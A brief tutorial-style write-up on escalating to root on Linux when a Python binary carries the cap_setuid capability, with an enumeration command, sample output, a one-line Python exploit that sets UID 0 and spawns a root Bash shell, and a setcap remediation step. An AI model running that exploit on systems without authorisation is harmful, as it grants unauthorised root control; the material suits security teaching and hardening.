
## 🚀 Linux Privilege Escalation: Python `cap_setuid` Misconfiguration

### 📌 Overview
This technique demonstrates how to escalate privileges from a low-privileged user to `root` when the Python binary has been mistakenly granted the `cap_setuid` Linux capability (`cap_setuid=ep`). This capability allows the process to manipulate user IDs (UIDs), enabling an interactive shell to run as root.

---

### 🔍 1. Enumeration & Discovery
To search the filesystem recursively for binaries or files configured with high-privilege capabilities, execute:

```bash
getcap -r / 2>/dev/null
```

**Vulnerable Target Output:**
```text
/usr/bin/python3.12 cap_setuid=ep
```

---

### 🚀 2. Exploitation (Spawning a Root Shell)
Leverage the `cap_setuid` privilege by invoking the vulnerable Python binary. The Python script changes the current process User ID to `0` (root) and spawns an interactive Bash shell:

```bash
/usr/bin/python3.12 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

---

### 🛡️ 3. Remediation & Hardening
To eliminate this privilege escalation vector, remove the assigned capability from the binary entirely using `setcap`:

```bash
sudo setcap -r /usr/bin/python3.12
```
